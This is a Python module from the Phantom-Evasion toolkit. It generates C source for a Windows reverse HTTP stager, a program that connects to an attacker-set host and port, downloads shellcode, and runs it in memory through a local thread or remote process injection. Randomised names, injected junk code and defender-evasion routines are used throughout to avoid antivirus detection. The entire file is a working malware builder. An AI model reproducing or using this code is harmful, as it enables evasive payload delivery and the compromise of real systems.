
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################

import sys
sys.path.append("Modules/payloads/auxiliar")

import inject_utils

from usefull import EncryptionManager
from usefull import varname_creator
from usefull import JunkInjector
from usefull import WindowsDefend
from usefull import UriGenerator
#from usefull import WindowsDecoyProc
#from usefull import CloseDecoyProc
from usefull import CheckForBackslash
from usefull import Remote_methods
from usefull import IncludeShuffler
from usefull import WriteSource

def RevHttpStager_C_windows(ModOpt):

    Lhost = CheckForBackslash(ModOpt["Lhost"])
    Lport = ModOpt["Lport"]
    MemAlloc = ModOpt["MemAlloc"]
    ExecMethod = ModOpt["ExecMethod"]

    Randlpv = varname_creator()
    Randlpv2 = varname_creator()
    Randpointer2 = varname_creator()
    Randbuff = varname_creator()
    Randversion = varname_creator()
    Randwsadata = varname_creator()
    RandRevtarget = varname_creator()
    Randsock = varname_creator()
    RandSocket = varname_creator()
    RandRecv_int = varname_creator()

    Arch = ModOpt["Arch"]
    MemAlloc = ModOpt["MemAlloc"]
    ExecMethod = ModOpt["ExecMethod"]

    if ModOpt["MemAlloc"] in ["SharedSection","SS"]:

        ModOpt["Buff"] = Randlpv
        ModOpt["Lpvoid"] = varname_creator()
    else:
        ModOpt["Buff"] = Randlpv
        ModOpt["Lpvoid"] = Randlpv

    ModOpt["Decoder"] = "False"

    ModOpt["Bufflen"] = "1000000"

    Ret_code = ""
    Ret_code += "#define _WIN32_WINNT 0x0500\n"
    Ret_code += "#include <winsock2.h>\n"

    IncludeList = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

    Ret_code += IncludeShuffler(IncludeList) + "#include <tlhelp32.h>\n"

    if ModOpt["Outformat"] == "exe":

        Ret_code += "int main(int argc,char * argv[]){\n"

    elif ModOpt["Outformat"] == "dll":

        if ModOpt["Reflective"] == True:

            Ret_code += "#include \"ReflectiveLoader.h\"\n"

        Ret_code += "BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpReserved){\n"
        Ret_code += "BOOL bReturnValue = TRUE;\n"
        Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"


    Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += WindowsDecoyProc(ModOpt["DecoyProc"])

    Ret_code += "$:EVA\n"

    Ret_code += "char * " + Randlpv + ";\n"
    Ret_code += "WORD " + Randversion + " = MAKEWORD(2,2);WSADATA " + Randwsadata + ";\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()
        WS2_32 = varname_creator()
        NdcWSAStartup = varname_creator()
        NdcWSACleanup = varname_creator() 
        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
        Ret_code += "HANDLE " + WS2_32 + " = GetModuleHandle(\"ws2_32.dll\");\n"
        Ret_code += "FARPROC " + NdcWSAStartup + " = GetProcAddress(" + WS2_32 + ", \"WSAStartup\");\n"
        Ret_code += "FARPROC " + NdcWSACleanup + " = GetProcAddress(" + WS2_32 + ", \"WSACleanup\");\n"
        Ret_code += "if (" + NdcWSAStartup + "(" + Randversion + ", &" + Randwsadata + ") < 0){"
        Ret_code += NdcWSACleanup + "();exit(1);}\n"
    else:
        
        Ret_code += "if (WSAStartup(" + Randversion + ", &" + Randwsadata + ") < 0){\n"
        Ret_code += "WSACleanup();exit(1);}\n"

    Ret_code += "struct hostent * " + RandRevtarget + ";struct sockaddr_in " + Randsock + ";SOCKET " + RandSocket + ";\n"
    Ret_code += RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"

    if ModOpt["DynImport"] == True:

        Ret_code += "if (" + RandSocket + " == INVALID_SOCKET){closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"

    Ret_code += RandRevtarget + " = gethostbyname(\"" + ModOpt["Lhost"] + "\");\n"     #Lhost

    if ModOpt["DynImport"] == True:

        Ret_code += "if (" + RandRevtarget + " == NULL){closesocket(" + RandSocket + ");" + NdcWSACleanup + "();exit(1);}\n"
    else:
        Ret_code += "if (" + RandRevtarget + " == NULL){closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"

    Ret_code += "memcpy(&" + Randsock + ".sin_addr.s_addr, " + RandRevtarget + "->h_addr, " + RandRevtarget + "->h_length);\n"
    Ret_code += Randsock + ".sin_family = AF_INET;\n"
    Ret_code += Randsock + ".sin_port = htons((" + ModOpt["Lport"] + "));\n"        #Lport
    Ret_code += "if ( connect(" + RandSocket + ", (struct sockaddr *)&" + Randsock + ", sizeof(" + Randsock + ")) ){closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
    Ret_code += "char " + Randbuff + "[400] = \"GET /" + UriGenerator() + " HTTP/1.1\\r\\nHost: " + Lhost + ":" + Lport + "\\r\\nConnection: Keep-Alive\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\\r\\n\\r\\n\";\n"
    Ret_code += "send(" + RandSocket + "," + Randbuff + ", strlen( " + Randbuff + " ),0);\n"
    Ret_code += "Sleep(300);\n"

    Ret_code += inject_utils.Win_MemLocal(ModOpt)

    Ret_code += "char * " + Randpointer2 + " = " + Randlpv + ";\n"
    Ret_code += "int " + RandRecv_int + ";\n"
    Ret_code += "do {" + RandRecv_int + " = recv(" + RandSocket + ", " + Randpointer2 + ", 1024, 0);\n"
    Ret_code += "" + Randpointer2 + " += " + RandRecv_int + ";\n"
    Ret_code += "}while ( " + RandRecv_int + " > 0 );\n"

    if ModOpt["DynImport"] == True:

        Ret_code += "closesocket(" + RandSocket + ");" + NdcWSACleanup + "();\n"

    else:
        Ret_code += "closesocket(" + RandSocket + ");WSACleanup();\n"

    if "RW/" in MemAlloc and ExecMethod == "Thread":

        Ret_code += inject_utils.Win_ChangeMemProtect(ModOpt)

    Ret_code += Randlpv + " = strstr(" + Randlpv + ", \"\\r\\n\\r\\n\") + 4;\n"

    if  ModOpt["ExecMethod"] == "Thread":

        Ret_code += inject_utils.Win_LocalThread(ModOpt)
    else:    
        Ret_code += inject_utils.Win_RemoteInjection(ModOpt)

    Ret_code += "$:END\n"

    #Ret_code += CloseDecoyProc(ModOpt["DecoyProc"])

    Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],ModOpt["EF"],ModOpt["JR"])
    
    if ModOpt["Outformat"] == "exe":

        Ret_code += "return 0;}"

    elif ModOpt["Outformat"] == "dll":

        Ret_code += "}\n"
        Ret_code += "return bReturnValue;}\n"

    WriteSource("Source.c",Ret_code)

